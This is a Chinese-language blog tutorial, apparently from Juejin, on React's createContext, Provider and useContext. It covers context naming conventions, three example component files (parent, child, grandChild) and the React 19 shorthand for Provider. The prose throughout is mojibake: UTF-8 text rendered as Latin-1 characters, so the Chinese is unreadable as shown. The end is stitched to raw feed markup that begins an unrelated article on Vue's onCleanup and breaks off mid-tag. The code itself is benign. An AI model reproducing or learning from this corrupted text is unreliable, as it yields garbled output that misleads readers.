<p>åˆ«äººçœ‹ä»£ç æ—¶ï¼Œåªè¦çœ‹åˆ° <code>UserContext</code>ï¼Œä¸ç”¨ç‚¹è¿›å»çœ‹é‡Œé¢çš„å†…å®¹ï¼Œå°±èƒ½ç«‹åˆ»çŸ¥é“ï¼šâ€œå“¦ï¼Œè¿™æ˜¯ä¸“é—¨ç”¨æ¥å…±äº«ç”¨æˆ·æ•°æ®çš„ä¸Šä¸‹æ–‡ï¼Œå­ç»„ä»¶ç”¨å®ƒèƒ½æ‹¿ç”¨æˆ·ä¿¡æ¯ / æ”¹ç”¨æˆ·ä¿¡æ¯â€ã€‚</p>
<h3 data-id="heading-4">2. ä¸è¿™ä¹ˆå‘½åä¼šæ€ä¹ˆæ ·ï¼Ÿ</h3>
<p>å¦‚æœä¹±èµ·åï¼Œæ¯”å¦‚ï¼šjsx</p>
<pre><code class="hljs language-ini" lang="ini">// åé¢ä¾‹å­1ï¼šåå­—å¤ªæ¨¡ç³Šï¼Œä¸çŸ¥é“å­˜å•¥
const <span class="hljs-attr">MyContext</span> = createContext({})<span class="hljs-comment">;</span>

// åé¢ä¾‹å­2ï¼šåªè¯´ç”¨é€”ä¸è¯´ç±»å‹ï¼Œä¸çŸ¥é“æ˜¯å•¥ä¸œè¥¿
const <span class="hljs-attr">UserData</span> = createContext({})<span class="hljs-comment">;</span>

// åé¢ä¾‹å­3ï¼šå®Œå…¨æ— å…³ï¼Œè®©äººå›°æƒ‘
const <span class="hljs-attr">ABC123</span> = createContext({})<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>ä½ è‡ªå·±è¿‡ 1 ä¸ªæœˆå†çœ‹ä»£ç ï¼Œå¯èƒ½å¿˜äº† <code>MyContext</code> é‡Œå­˜çš„æ˜¯ç”¨æˆ·æ•°æ®è¿˜æ˜¯ä¸»é¢˜æ•°æ®ï¼›</li>
<li>åŒäº‹æ¥æ‰‹ä½ çš„ä»£ç æ—¶ï¼Œå¾—é€è¡Œæ‰¾ <code>Provider</code> é‡Œçš„ <code>value</code> æ‰çŸ¥é“è¿™ä¸ªä¸Šä¸‹æ–‡çš„ç”¨é€”ï¼Œæµªè´¹æ—¶é—´</li>
</ul>
<h3 data-id="heading-5">3. å‘½åçš„é€šç”¨è§„åˆ™ï¼ˆä¸¾ä¸€åä¸‰ï¼‰</h3>
<p><code>Context</code> çš„å‘½åå¥—è·¯å¾ˆå›ºå®šï¼š<code>[æ•°æ®ç±»å‹/ç”¨é€”] + Context</code>ï¼Œç›®çš„æ˜¯ â€œè§åçŸ¥æ„â€ã€‚æ¯”å¦‚ï¼š</p>
<ul>
<li>å­˜ä¸»é¢˜é…ç½®ï¼ˆäº® / æš—è‰²ã€å­—ä½“å¤§å°ï¼‰â†’ å« <code>ThemeContext</code>ï¼›</li>
<li>å­˜ç”¨æˆ·æƒé™ï¼ˆæ˜¯å¦ç™»å½•ã€è§’è‰²ï¼‰â†’ å« <code>AuthContext</code>ï¼›</li>
<li>å­˜å…¨å±€è®¾ç½®ï¼ˆè¯­è¨€ã€é€šçŸ¥å¼€å…³ï¼‰â†’ å« <code>SettingsContext</code>ï¼›</li>
<li>å­˜è´­ç‰©è½¦æ•°æ®ï¼ˆå•†å“åˆ—è¡¨ã€ç»“ç®—æ–¹æ³•ï¼‰â†’ å« <code>CartContext</code>ã€‚</li>
</ul>
<h3 data-id="heading-6">4. å‘½åæ€»ç»“</h3>
<p><code>const UserContext = createContext({})</code> å‘½åä¸º <code>UserContext</code>ï¼Œæœ¬è´¨æ˜¯ã€Œç”¨åå­—ä¼ é€’ä¿¡æ¯ã€ï¼š</p>
<ul>
<li>ä¸ç”¨æ­»è®°ç¡¬èƒŒï¼Œçœ‹åˆ°åå­—å°±çŸ¥é“ â€œå­˜ä»€ä¹ˆã€æ˜¯ä»€ä¹ˆç±»å‹â€ï¼›</li>
<li>æ˜¯ React å¼€å‘çš„é€šç”¨çº¦å®šï¼Œè®©ä»£ç æ›´è§„èŒƒã€æ›´å®¹æ˜“ç»´æŠ¤ï¼›</li>
<li>ä¸æ˜¯ React çš„è¯­æ³•è¦æ±‚ï¼ˆæ”¹åˆ«çš„åå­—ä»£ç ä¹Ÿèƒ½è·‘ï¼‰ï¼Œä½†è¿™æ˜¯ â€œä¸“ä¸šå†™æ³•â€ çš„åŸºæœ¬è¦æ±‚ï½</li>
</ul>
<h2 data-id="heading-7">ä¸‰ã€æ ¸å¿ƒæ¦‚å¿µ</h2>
<p>ç»“åˆä»£ç ï¼Œä»£ç åœ¨<code>æœ€å</code>ï¼ˆparent.jsx/child.jsx/grandChild.jsxï¼‰ï¼Œ3 ä¸ªè§’è‰²å¯¹åº”å…³ç³»å¦‚ä¸‹ï¼š</p>
<h3 data-id="heading-8">1. â€œå‚¨ç‰©ç›’â€ çš„ 3 ä¸ªæ¦‚å¿µ</h3>

























<table><thead><tr><th>è§’è‰²</th><th>ä½œç”¨</th><th>ä»£ç ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>createContext</code></td><td>åˆ›å»º â€œå…¬å…±æ•°æ®ç›’å­â€ï¼ˆContextï¼‰</td><td>const UserContext = createContext({})</td></tr><tr><td><code>Context.Provider</code></td><td>ç»™ç›’å­è£…æ•°æ®ï¼Œå¹¶ç”¨å®ƒåŒ…è£¹å­ç»„ä»¶ï¼ˆåˆ†å‘æ•°æ®ï¼‰</td><td>&lt;UserContext.Provider value={sharedData}&gt;</td></tr><tr><td><code>useContext</code></td><td>å­ç»„ä»¶ä»ç›’å­é‡Œç›´æ¥æ‹¿æ•°æ®</td><td>useContext(UserContext)</td></tr></tbody></table>
<h3 data-id="heading-9">2. å‚¨ç‰©ç›’â€ çš„ 3 ä¸ªå…³é”®ç”¨æ³•</h3>
<ul>
<li>
<p><strong>é€ ç›’å­</strong>ï¼š<code>const UserContext = createContext({})</code> â†’ æ–°å»ºä¸€ä¸ªå« â€œç”¨æˆ·ç›¸å…³â€ çš„å‚¨ç‰©ç›’ï¼Œåˆå§‹å…ˆæ”¾ä¸ªç©ºç›’å­å ä½ï¼›</p>
</li>
<li>
<p><strong>è£…ä¸œè¥¿ + å‘ä¸‹å»</strong>ï¼šç”¨ <code>&lt;UserContext.Provider value={å…±äº«æ•°æ®}&gt;</code> â†’ ç»™ç›’å­é‡Œè£…ä¸Šè¦å…±äº«çš„ä¸œè¥¿ï¼ˆæ¯”å¦‚ä½ çš„ç”¨æˆ·ä¿¡æ¯ + ä¿®æ”¹æ–¹æ³•ï¼‰ï¼Œå†æŠŠç›’å­ â€œé€’åˆ°æ‰€æœ‰å­ç»„ä»¶é¢å‰â€ï¼ˆç”¨ Provider åŒ…è£¹å­ç»„ä»¶ï¼‰ï¼›</p>
</li>
<li>
<p><strong>ç›´æ¥æ‹¿ä¸œè¥¿</strong>ï¼šå­ç»„ä»¶é‡Œç”¨ <code>useContext(UserContext)</code> â†’ ä¸ç”¨é—®çˆ¶ç»„ä»¶è¦ï¼Œç›´æ¥ä»è¿™ä¸ªå…¬å…±ç›’å­é‡Œæ‹¿ä¸œè¥¿ï¼Œä¸ç®¡åµŒå¥—å¤šå°‘å±‚éƒ½èƒ½æ‹¿ã€‚</p>
</li>
</ul>
<h3 data-id="heading-10">3. å‚¨ç‰©ç›’å¤§ç™½è¯æ€»ç»“</h3>
<ul>
<li>ä¸ç”¨å† â€œçˆ¶ä¼ å­ã€å­ä¼ å­™â€ ä¸€å±‚å±‚é€’æ•°æ®ï¼ˆè§£å†³ä¹‹å‰ props é€’æ¥é€’å»çš„éº»çƒ¦ï¼‰ï¼›</li>
<li>ä¸€ä¸ªç›’å­ä¸“é—¨è£…ä¸€ç±»ä¸œè¥¿ï¼ˆæ¯”å¦‚ç”¨æˆ·æ•°æ®æ”¾ UserContextï¼Œä¸»é¢˜æ”¾ ThemeContextï¼‰ï¼Œä¸ä¹±ï¼›</li>
<li>åªè¦åœ¨ â€œå‘ç›’å­â€ï¼ˆProviderï¼‰çš„èŒƒå›´å†…ï¼Œæ‰€æœ‰ç»„ä»¶éƒ½èƒ½ç›´æ¥ç”¨ï¼Œçœäº‹å„¿ã€‚</li>
</ul>
<p>ä¸€å¥è¯æ”¶å°¾ï¼š<code>createContext</code> å°±æ˜¯ React ç»™ä½ çš„ â€œå…±äº«å‚¨ç‰©ç›’å·¥å…·â€ï¼Œé€ ä¸ªç›’å­ã€è£…è¿›å»ä¸œè¥¿ã€å¤§å®¶ç›´æ¥æ‹¿ï¼Œä¸ç”¨æŒ¨ä¸ªé€’ï½</p>
<h2 data-id="heading-11">å››ã€å®æˆ˜ç¤ºä¾‹</h2>
<h3 data-id="heading-12">1. æ–‡ä»¶ç»“æ„</h3>
<p>é¡¹ç›®æ–‡ä»¶ç»“æ„ï¼ˆåŒç›®å½•ä¸‹ 3 ä¸ªæ–‡ä»¶ï¼‰ï¼š</p>
<pre><code class="hljs">UseContextTest/ 
 â”œâ”€ parent.jsxï¼ˆçˆ¶ç»„ä»¶ï¼Œåˆ›å»ºContext+æä¾›æ•°æ®ï¼‰ 
 â”œâ”€ child.jsxï¼ˆå­ç»„ä»¶ï¼Œè¯»å–æ•°æ®ï¼‰ 
 â””â”€ grandChild.jsxï¼ˆå­™ç»„ä»¶ï¼Œè¯»å–æ•°æ®ï¼‰
</code></pre>
<h3 data-id="heading-13">2. çˆ¶ç»„ä»¶ï¼šåˆ›å»º Context + æä¾›æ•°æ®ï¼ˆparent.jsxï¼‰</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. å¯¼å…¥ React å’Œéœ€è¦çš„ Hookï¼ˆcreateContext ç”¨æ¥åˆ›å»ºä¸Šä¸‹æ–‡ï¼ŒuseContext ç”¨æ¥è¯»å–ï¼ŒuseState ç”¨æ¥ç®¡ç†çŠ¶æ€ï¼‰</span>
<span class="hljs-keyword">import</span> { createContext, useState,  } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./child'</span>;
<span class="hljs-comment">// 2. åˆ›å»ºä¸€ä¸ª Contextï¼ˆç›¸å½“äºä¸€ä¸ª"æ•°æ®å®¹å™¨"ï¼Œä¸“é—¨å­˜è¦å…±äº«çš„ä¸œè¥¿ï¼‰</span>
<span class="hljs-comment">// ä¼ å…¥é»˜è®¤å€¼ï¼ˆåªæœ‰æ²¡æ‰¾åˆ° Provider æ—¶æ‰ä¼šç”¨ï¼Œè¿™é‡Œå…ˆå†™ä¸ªç©ºå¯¹è±¡å ä½ï¼‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">UserContext</span> = <span class="hljs-title function_">createContext</span>({});

<span class="hljs-comment">// 3. çˆ¶ç»„ä»¶ï¼ˆé¡¶å±‚ç»„ä»¶ï¼Œè´Ÿè´£æä¾›æ•°æ®ï¼‰</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">UseContextTest</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// å®šä¹‰è¦å…±äº«çš„çŠ¶æ€ï¼šå½“å‰ç”¨æˆ·ä¿¡æ¯</span>
  <span class="hljs-keyword">const</span> [user, setUser] = <span class="hljs-title function_">useState</span>({
    <span class="hljs-attr">name</span>: <span class="hljs-string">'å°æ˜'</span>,
    <span class="hljs-attr">age</span>: <span class="hljs-number">10</span>,
    <span class="hljs-attr">grade</span>: <span class="hljs-string">'å°å­¦å››å¹´çº§'</span>
  });

  <span class="hljs-comment">// å®šä¹‰è¦å…±äº«çš„æ–¹æ³•ï¼šä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ï¼ˆå­ç»„ä»¶å¯ä»¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•æ”¹æ•°æ®ï¼‰</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">changeUser</span> = (<span class="hljs-params">newName, newAge</span>) =&gt; {
    <span class="hljs-title function_">setUser</span>({
      ...user, <span class="hljs-comment">// ä¿ç•™åŸæ¥çš„ gradeï¼Œåªæ”¹ name å’Œ age</span>
      <span class="hljs-attr">name</span>: newName,
      <span class="hljs-attr">age</span>: newAge
    });
  };

  <span class="hljs-comment">// æŠŠè¦å…±äº«çš„æ•°æ®å’Œæ–¹æ³•æ‰“åŒ…æˆä¸€ä¸ªå¯¹è±¡</span>
  <span class="hljs-keyword">const</span> sharedData = {
    <span class="hljs-attr">userInfo</span>: user, <span class="hljs-comment">// å…±äº«çš„ç”¨æˆ·æ•°æ®</span>
    <span class="hljs-attr">updateUser</span>: changeUser <span class="hljs-comment">// å…±äº«çš„ä¿®æ”¹æ–¹æ³•</span>
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">padding:</span> <span class="hljs-attr">20</span> }}&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>çˆ¶ç»„ä»¶ï¼ˆAppï¼‰<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>å½“å‰å…±äº«çš„ç”¨æˆ·ï¼š{user.name}ï¼Œ{user.age}å²<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

      {/* 4. ç”¨ Provider æŠŠæ•°æ®"æ³¨å…¥"ç»™å­ç»„ä»¶ */}
      {/* value å±æ€§ï¼šä¼ å…¥è¦å…±äº«çš„å¯¹è±¡ï¼ˆå¿…é¡»å†™è¿™ä¸ªï¼Œå­ç»„ä»¶æ‰èƒ½æ‹¿åˆ°ï¼‰ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">UserContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{sharedData}</span>&gt;</span>
        {/* å­ç»„ä»¶ï¼šä¸ç”¨ä¼  propsï¼Œç›´æ¥èƒ½æ‹¿åˆ°å…±äº«æ•°æ® */}
        <span class="hljs-tag">&lt;<span class="hljs-name">Child</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">UserContext.Provider</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// å…³é”®ï¼šå¯¼å‡º UserContextï¼Œä¾›å­ç»„ä»¶å¯¼å…¥ä½¿ç”¨ï¼</span>
<span class="hljs-keyword">export</span> { <span class="hljs-title class_">UserContext</span> }
</code></pre>
<h3 data-id="heading-14">3. å­ç»„ä»¶ï¼šè¯»å–å…±äº«æ•°æ®ï¼ˆchild.jsxï¼‰</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useContext } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">UserContext</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./parent'</span>; <span class="hljs-comment">// é‡ç‚¹ï¼šè·¯å¾„+è§£æ„éƒ½ä¸èƒ½é”™ï¼</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">GrandChild</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./grandChild'</span>; <span class="hljs-comment">// å¼•å…¥å­™ç»„ä»¶</span>
<span class="hljs-comment">// 5. å­ç»„ä»¶ï¼ˆä¸­é—´å±‚ï¼Œç›´æ¥è¯»å–å…±äº«æ•°æ®ï¼‰</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// ç”¨ useContext è¯»å–å…±äº«æ•°æ®ï¼ˆå‚æ•°å°±æ˜¯ä¸Šé¢åˆ›å»ºçš„ UserContextï¼‰</span>
  <span class="hljs-keyword">const</span> { userInfo, updateUser } = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">UserContext</span>);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">padding:</span> <span class="hljs-attr">20</span>, <span class="hljs-attr">margin:</span> <span class="hljs-attr">20</span>, <span class="hljs-attr">border:</span> '<span class="hljs-attr">1px</span> <span class="hljs-attr">solid</span> #<span class="hljs-attr">ccc</span>' }}&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­ç»„ä»¶ï¼ˆChildï¼‰<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>ä» Context æ‹¿åˆ°çš„ç”¨æˆ·ï¼š{userInfo.name}ï¼Œ{userInfo.grade}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      {/* è°ƒç”¨å…±äº«çš„æ–¹æ³•ï¼Œä¿®æ”¹æ•°æ® */}
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> updateUser('å°çº¢', 11)}&gt;
        ç‚¹å‡»ä¿®æ”¹ç”¨æˆ·ä¸º"å°çº¢"
      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>

      {/* å­™ç»„ä»¶ï¼šåŒæ ·ä¸ç”¨ä¼  propsï¼Œç›´æ¥è®¿é—®å…±äº«æ•°æ® */}
      {/* <span class="hljs-tag">&lt;<span class="hljs-name">GrandChild</span> /&gt;</span> å·²ç»åœ¨é¡¶å±‚ Provider çš„ â€œè¦†ç›–èŒƒå›´â€ é‡Œäº†ï¼Œä¸éœ€è¦é‡å¤åŒ…è£¹ï¼ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">GrandChild</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h3 data-id="heading-15">4. å­™ç»„ä»¶ï¼šè·¨å±‚çº§è¯»å–æ•°æ®ï¼ˆgrandChild.jsxï¼‰</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useContext } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">UserContext</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./parent'</span>; <span class="hljs-comment">// é‡ç‚¹ï¼šè·¯å¾„+è§£æ„éƒ½ä¸èƒ½é”™ï¼</span>
<span class="hljs-comment">// 6. å­™ç»„ä»¶ï¼ˆæœ€åº•å±‚ï¼Œè·¨ä¸¤å±‚æ‹¿åˆ°æ•°æ®ï¼‰</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">GrandChild</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// åŒæ ·ç”¨ useContext è¯»å–ï¼Œå’Œå­ç»„ä»¶å†™æ³•ä¸€æ ·</span>
  <span class="hljs-keyword">const</span> { userInfo, updateUser } = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">UserContext</span>);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">padding:</span> <span class="hljs-attr">20</span>, <span class="hljs-attr">margin:</span> <span class="hljs-attr">20</span>, <span class="hljs-attr">border:</span> '<span class="hljs-attr">1px</span> <span class="hljs-attr">solid</span> #<span class="hljs-attr">ddd</span>' }}&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>å­™ç»„ä»¶ï¼ˆGrandChildï¼‰<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>è·¨ä¸¤å±‚æ‹¿åˆ°çš„ç”¨æˆ·ï¼š{userInfo.name}ï¼Œ{userInfo.age}å²<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      {/* è°ƒç”¨å…±äº«çš„æ–¹æ³•ï¼Œä¿®æ”¹æ•°æ® */}
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> updateUser('å°åˆš', 12)}&gt;
        ç‚¹å‡»ä¿®æ”¹ç”¨æˆ·ä¸º"å°åˆš"
      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h3 data-id="heading-16">5. è¿è¡Œæ•ˆæœ</h3>
<ul>
<li>
<p>çˆ¶ã€å­ã€å­™ç»„ä»¶éƒ½èƒ½æ˜¾ç¤ºåŒä¸€ä¸ªç”¨æˆ·ä¿¡æ¯ï¼›</p>
</li>
<li>
<p>ç‚¹å‡»ä»»æ„ç»„ä»¶çš„ â€œä¿®æ”¹â€ æŒ‰é’®ï¼Œæ‰€æœ‰ç»„ä»¶çš„ç”¨æˆ·ä¿¡æ¯ä¼šåŒæ­¥æ›´æ–°ï¼›</p>
</li>
<li>
<p>ä¸­é—´ç»„ä»¶ï¼ˆChildï¼‰æ— éœ€ä¼ é€’ <code>props</code>ï¼Œåªè´Ÿè´£æ¸²æŸ“å­ç»„ä»¶å³å¯ã€‚</p>
</li>
</ul>
<h3 data-id="heading-17">6.å…³é”®æ³¨æ„äº‹é¡¹ï¼ˆé¿å‘æŒ‡å—ï¼‰</h3>
<ol>
<li><strong>Context ä¸èƒ½ä» react å¯¼å…¥</strong>ï¼š<code>UserContext</code> æ˜¯ä½ è‡ªå·±ç”¨ <code>createContext</code> åˆ›å»ºçš„ï¼Œä¸æ˜¯ React å†…ç½® APIï¼Œå¯¼å…¥æ—¶è¦ä»çˆ¶ç»„ä»¶æ–‡ä»¶å¯¼å…¥ï¼ˆå¦‚ <code>import { UserContext } from './parent'</code>ï¼‰ã€‚</li>
<li><strong>Provider å¿…é¡»åŒ…è£¹å­ç»„ä»¶</strong>ï¼šåªæœ‰è¢« <code>&lt;UserContext.Provider&gt;</code> åŒ…è£¹çš„ç»„ä»¶ï¼Œæ‰èƒ½ç”¨ <code>useContext</code> è¯»å–æ•°æ®ï¼Œå¦åˆ™åªèƒ½æ‹¿åˆ° <code>createContext</code> çš„é»˜è®¤å€¼ã€‚</li>
<li><strong>æ— éœ€é‡å¤åŒ…è£¹ Provider</strong>ï¼šå­™ç»„ä»¶ä¸ç”¨å†å¥— <code>Provider</code>ï¼Œåªè¦åœ¨é¡¶å±‚ï¼ˆçˆ¶ç»„ä»¶ï¼‰åŒ…ä¸€æ¬¡ï¼Œæ•°æ®ä¼šè‡ªåŠ¨ç©¿é€æ‰€æœ‰åµŒå¥—å­ç»„ä»¶ã€‚</li>
<li><strong>å¯¼å…¥è·¯å¾„è¦æ­£ç¡®</strong>ï¼šå­ç»„ä»¶ / å­™ç»„ä»¶å¯¼å…¥ <code>UserContext</code> æ—¶ï¼Œè·¯å¾„è¦å’Œæ–‡ä»¶å®é™…ä½ç½®å¯¹åº”ï¼ˆæ¯”å¦‚åŒç›®å½•å†™ <code>./parent</code>ï¼Œä¸Šçº§ç›®å½•å†™ <code>../parent</code>ï¼‰ã€‚</li>
<li><strong>å‘½åè§„èŒƒ</strong>ï¼šContext å‘½åå»ºè®®ç”¨ã€Œç”¨é€” + Contextã€ï¼ˆå¦‚ <code>UserContext</code> å­˜ç”¨æˆ·æ•°æ®ï¼Œ<code>ThemeContext</code> å­˜ä¸»é¢˜æ•°æ®ï¼‰ï¼Œè§åçŸ¥æ„ã€‚</li>
</ol>
<h2 data-id="heading-18">äº”ã€æ ¸å¿ƒæ€»ç»“</h2>
<h3 data-id="heading-19">1. 3æ­¥èµ°</h3>
<p><code>createContext</code> çš„æ ¸å¿ƒé€»è¾‘å°±æ˜¯ â€œ3 æ­¥èµ°â€ï¼š</p>
<ol>
<li>ç”¨ <code>createContext()</code> é€ ä¸€ä¸ª â€œå…¬å…±æ•°æ®ç›’å­â€ï¼›</li>
<li>ç”¨ <code>&lt;Context.Provider value={æ•°æ®}&gt;</code> ç»™ç›’å­è£…ä¸œè¥¿ï¼Œå¹¶åˆ†å‘åˆ°å­ç»„ä»¶ï¼›</li>
<li>ç”¨ <code>useContext(Context)</code> åœ¨ä»»æ„å­ç»„ä»¶ï¼ˆæ— è®ºåµŒå¥—å¤šæ·±ï¼‰ç›´æ¥æ‹¿ä¸œè¥¿ã€‚</li>
</ol>
<p>å®ƒè§£å†³äº† â€œprop drillingâ€ çš„ç—›ç‚¹ï¼Œé€‚åˆä¸­å°å‹é¡¹ç›®çš„å…¨å±€æ•°æ®å…±äº«ï¼ˆå¦‚ç”¨æˆ·ä¿¡æ¯ã€ä¸»é¢˜é…ç½®ç­‰ï¼‰ï¼Œç”¨æ³•ç®€æ´ä¸”æ— éœ€ä¾èµ–ç¬¬ä¸‰æ–¹åº“ã€‚</p>
<h3 data-id="heading-20">2. æ³¨æ„é¡¹</h3>
<p>åœ¨ React 19 åŠä¹‹åçš„ç‰ˆæœ¬ä¸­ï¼Œ<code>createContext</code> åˆ›å»ºçš„ Context å¯¹è±¡<strong>å¯ä»¥ç›´æ¥ä½œä¸º Provider ç»„ä»¶ä½¿ç”¨</strong>ï¼ˆç­‰ä»·äºåŸæ¥çš„ <code>Context.Provider</code>ï¼‰ï¼Œæ‰€ä»¥ä¸éœ€è¦å†å†™ <code>.Provider</code> äº†ã€‚</p>
<h4 data-id="heading-21">æ ¸å¿ƒåŸå› ï¼šReact 19 çš„è¯­æ³•ç®€åŒ–</h4>
<p>åœ¨ React 18 åŠæ›´æ—©ç‰ˆæœ¬ä¸­ï¼Œå¿…é¡»æ˜¾å¼å†™ <code>Context.Provider</code> æ‰èƒ½ä¼ é€’æ•°æ®ï¼›ä½† <strong>React 19 ä¸ºäº†ç®€åŒ–ä»£ç </strong>ï¼Œæ–°å¢äº†ã€ŒContext å¯¹è±¡ç›´æ¥ä½œä¸º Provider ç»„ä»¶ã€çš„è¯­æ³•ï¼Œæ­¤æ—¶ï¼š</p>
<pre><code class="hljs language-xml" lang="xml">// React 19 æ–°å†™æ³•ï¼ˆç­‰ä»·äºæ—§å†™æ³•çš„ Context.Providerï¼‰
<span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{theme}</span>&gt;</span>
  {/* å­ç»„ä»¶ */}
<span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext</span>&gt;</span>
</code></pre>
<p>å®Œå…¨ç­‰ä»·äº React 18 åŠä¹‹å‰çš„å†™æ³•ï¼š</p>
<pre><code class="hljs language-xml" lang="xml">// React 18 åŠæ›´æ—©çš„å†™æ³•
<span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{theme}</span>&gt;</span>
  {/* å­ç»„ä»¶ */}
<span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span>
</code></pre>
<h4 data-id="heading-22">è¡¥å……è¯´æ˜</h4>
<p>è¿™ä¸ªè¯­æ³•åªæ˜¯<strong>å†™æ³•ç®€åŒ–</strong>ï¼ŒåŠŸèƒ½å’ŒåŸæ¥çš„ <code>Context.Provider</code> å®Œå…¨ä¸€è‡´ï¼š</p>
<ul>
<li>ä¾ç„¶éœ€è¦é€šè¿‡ <code>value</code> å±æ€§ä¼ é€’æ•°æ®ï¼›</li>
<li>ä¾ç„¶ä¼šå‘ä¸‹å¹¿æ’­æ•°æ®ï¼Œåä»£ç»„ä»¶ç”¨ <code>useContext</code> ä¾ç„¶èƒ½æ­£å¸¸è·å–å€¼ï¼›</li>
<li>ä»…åœ¨ React 19 åŠä¹‹åç‰ˆæœ¬æ”¯æŒï¼ˆå¦‚æœä½ çš„é¡¹ç›®æ˜¯ React 18 åŠä»¥ä¸‹ï¼Œè¿˜æ˜¯å¾—å†™ <code>.Provider</code>ï¼‰ã€‚</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä½¿ç”¨ onCleanupå¤„ç†å¼‚æ­¥å‰¯ä½œç”¨]]></title>    <link>https://juejin.cn/post/7592559120118480942</link>    <guid>https://juejin.cn/post/7592559120118480942</guid>    <pubDate>2026-01-08T03:41:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592559120118480942" data-draft-id="7592610104441110538" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä½¿ç”¨ onCleanupå¤„ç†å¼‚æ­¥å‰¯ä½œç”¨"/> <meta itemprop="keywords" content="Vue.js,å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T03:41:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ»¡å¤©æ˜Ÿè¾°"/> <meta itemprop="url" 